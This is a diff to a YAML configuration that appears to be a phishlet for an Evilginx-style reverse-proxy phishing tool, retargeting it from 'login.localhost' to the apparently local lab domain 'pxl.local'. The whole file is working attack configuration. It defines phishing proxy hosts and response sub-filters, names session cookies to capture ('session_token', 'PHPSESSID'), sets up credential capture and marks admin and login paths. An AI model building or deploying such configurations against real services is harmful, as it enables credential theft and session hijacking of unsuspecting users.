@@ -2,14 +2,13 @@ min_ver: '3.0.0'
 author: 'vndck'
 
 proxy_hosts:
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'localhost', session: true, is_landing: true}
-  - {phish_sub: '', orig_sub: '', domain: 'localhost', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'pxl.local', session: true, is_landing: false}
   
 sub_filters:
-  - {triggers_on: 'login.localhost', orig_sub: 'localhost', domain: 'localhost', search: 'https://{hostname}/index.php', replace: 'https://{hostname}/index.php', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'pxl.local', orig_sub: 'login', domain: 'pxl.local', search: 'https://{hostname}/index.php', replace: 'https://{hostname}/index.php', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
 
 auth_tokens:
-  - domain: 'login.localhost'
+  - domain: 'pxl.local'
     keys: ['session_token', 'PHPSESSID']
 
 credentials:
@@ -30,5 +29,5 @@ auth_urls:
   - '/admin.php'
 
 login:
-  domain: 'login.localhost'
+  domain: 'pxl.local'
   path: '/index.php'
